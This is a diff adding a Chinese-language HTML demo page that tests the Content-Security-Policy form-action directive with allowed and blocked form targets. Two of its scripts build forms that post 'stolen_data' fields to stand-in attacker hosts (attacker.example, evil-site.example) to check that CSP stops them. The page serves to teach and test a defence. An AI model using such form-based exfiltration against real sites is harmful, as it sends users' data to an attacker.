@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSP form-action 示例 - 受限版</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    .demo-box {
+      border: 1px solid #ccc;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 5px;
+    }
+    .success { color: green; }
+    .error { color: red; }
+    .warning { color: orange; }
+    .nav { margin-bottom: 20px; }
+    .nav a {
+      margin-right: 15px;
+      text-decoration: none;
+      padding: 5px 10px;
+      background-color: #f0f0f0;
+      border-radius: 3px;
+    }
+    form {
+      margin-top: 15px;
+    }
+    input, button {
+      padding: 8px;
+      margin: 5px 0;
+    }
+    input[type="text"] {
+      width: 300px;
+    }
+    pre {
+      background: #f5f5f5;
+      padding: 10px;
+      border-radius: 5px;
+      overflow-x: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="nav">
+    <a href="/">受限版</a>
+    <a href="/unrestricted">无限制版</a>
+    <a href="/blocked">完全禁止版</a>
+  </div>
+
+  <h1>CSP form-action 指令演示 - 受限版</h1>
+  <p>当前页面应用了以下CSP策略:</p>
+  <code>form-action 'self' https://trusted-form-processor.example; default-src 'self'; script-src 'self' 'unsafe-inline'</code>
+  <p>这意味着表单只能提交到当前域名或trusted-form-processor.example域名。</p>
+
+  <div class="demo-box">
+    <h2>表单提交测试</h2>
+    
+    <h3>允许的表单目标 (同源)</h3>
+    <form id="same-origin-form" action="/form-handler" method="post">
+      <div>
+        <label for="name1">姓名:</label>
+        <input type="text" id="name1" name="name" value="张三">
+      </div>
+      <div>
+        <label for="message1">消息:</label>
+        <input type="text" id="message1" name="message" value="这是一个同源表单提交测试">
+      </div>
+      <button type="submit">提交到同源</button>
+    </form>
+    
+    <h3>允许的表单目标 (信任的外部域名)</h3>
+    <form id="trusted-domain-form" action="https://trusted-form-processor.example/process" method="post">
+      <div>
+        <label for="name2">姓名:</label>
+        <input type="text" id="name2" name="name" value="李四">
+      </div>
+      <div>
+        <label for="message2">消息:</label>
+        <input type="text" id="message2" name="message" value="这是一个信任域名表单提交测试">
+      </div>
+      <button type="submit">提交到信任域名</button>
+      <p class="warning">注意: 这会尝试提交到一个不存在的域名，所以会失败，但CSP不会阻止</p>
+    </form>
+    
+    <h3>被阻止的表单目标 (不信任的外部域名)</h3>
+    <form id="untrusted-domain-form" action="https://untrusted-site.example/process" method="post">
+      <div>
+        <label for="name3">姓名:</label>
+        <input type="text" id="name3" name="name" value="王五">
+      </div>
+      <div>
+        <label for="message3">消息:</label>
+        <input type="text" id="message3" name="message" value="这是一个不信任域名表单提交测试">
+      </div>
+      <button type="submit">提交到不信任域名</button>
+      <p class="error">这个表单提交应该被CSP阻止</p>
+    </form>
+  </div>
+
+  <div class="demo-box">
+    <h2>动态表单提交测试</h2>
+    
+    <h3>动态创建的表单 (指向不信任域名)</h3>
+    <button id="create-dynamic-form">创建并提交动态表单</button>
+    <div id="dynamic-form-container"></div>
+    
+    <script>
+      $(document).ready(function() {
+        $('#create-dynamic-form').click(function() {
+          // 创建一个指向不信任域名的表单
+          const formHTML = `
+            <form id="dynamic-form" action="https://attacker.example/steal-data" method="post">
+              <input type="hidden" name="stolen_data" value="敏感数据">
+              <button type="submit">提交动态表单</button>
+            </form>
+          `;
+          
+          $('#dynamic-form-container').html(formHTML);
+          $('#dynamic-form-container').append('<p class="warning">已创建动态表单，但提交时应该被CSP阻止</p>');
+          
+          // 尝试自动提交
+          setTimeout(function() {
+            try {
+              $('#dynamic-form').submit();
+              $('#dynamic-form-container').append('<p class="error">如果你看到这条消息但没有错误，说明CSP没有正确阻止提交</p>');
+            } catch(e) {
+              $('#dynamic-form-container').append('<p class="success">动态表单提交被阻止: ' + e.message + '</p>');
+            }
+          }, 500);
+        });
+      });
+    </script>
+  </div>
+
+  <div class="demo-box">
+    <h2>JavaScript 表单提交测试</h2>
+    
+    <button id="js-submit-allowed">使用JS提交到允许的目标</button>
+    <button id="js-submit-blocked">使用JS提交到被阻止的目标</button>
+    <div id="js-submit-result"></div>
+    
+    <script>
+      $(document).ready(function() {
+        // JS提交到允许的目标
+        $('#js-submit-allowed').click(function() {
+          // 创建一个隐藏表单
+          const form = document.createElement('form');
+          form.style.display = 'none';
+          form.method = 'POST';
+          form.action = '/form-handler';
+          
+          // 添加表单字段
+          const nameField = document.createElement('input');
+          nameField.type = 'text';
+          nameField.name = 'name';
+          nameField.value = 'JavaScript提交';
+          
+          const messageField = document.createElement('input');
+          messageField.type = 'text';
+          messageField.name = 'message';
+          messageField.value = '这是通过JavaScript提交到允许目标的表单';
+          
+          form.appendChild(nameField);
+          form.appendChild(messageField);
+          document.body.appendChild(form);
+          
+          try {
+            form.submit();
+            $('#js-submit-result').html('<p class="success">表单已提交到允许的目标</p>');
+          } catch(e) {
+            $('#js-submit-result').html('<p class="error">提交失败: ' + e.message + '</p>');
+          }
+        });
+        
+        // JS提交到被阻止的目标
+        $('#js-submit-blocked').click(function() {
+          // 创建一个隐藏表单
+          const form = document.createElement('form');
+          form.style.display = 'none';
+          form.method = 'POST';
+          form.action = 'https://evil-site.example/steal';
+          
+          // 添加表单字段
+          const dataField = document.createElement('input');
+          dataField.type = 'text';
+          dataField.name = 'stolen_data';
+          dataField.value = '敏感用户数据';
+          
+          form.appendChild(dataField);
+          document.body.appendChild(form);
+          
+          try {
+            form.submit();
+            $('#js-submit-result').html('<p class="error">表单已提交到不允许的目标，CSP可能未生效</p>');
+          } catch(e) {
+            $('#js-submit-result').html('<p class="success">提交被CSP阻止: ' + e.message + '</p>');
+          }
+          
+          // 监听CSP违规
+          document.addEventListener('securitypolicyviolation', function(e) {
+            if (e.blockedURI.includes('evil-site.example')) {
+              $('#js-submit-result').append('<p class="success">检测到CSP违规: ' + e.violatedDirective + '</p>');
+            }
+          });
+        });
+      });
+    </script>
+  </div>
+
+  <div class="demo-box">
+    <h2>form-action 的安全意义</h2>
+    <p>form-action指令限制表单可以提交到的URL，可以防止:</p>
+    <ul>
+      <li>跨站点请求伪造(CSRF)攻击</li>
+      <li>通过DOM XSS注入的表单被提交到攻击者控制的服务器</li>
+      <li>用户敏感数据被恶意表单窃取</li>
+      <li>通过修改表单的action属性进行的钓鱼攻击</li>
+    </ul>
+    <p>这是一项重要的防御措施，特别是对于处理敏感用户数据的网站。</p>
+  </div>
+
+  <p>
+    <b>注意:</b> 在浏览器的开发者工具控制台中，你应该能看到被阻止的表单提交的CSP违规警告。
+  </p>
+</body>
+</html> 
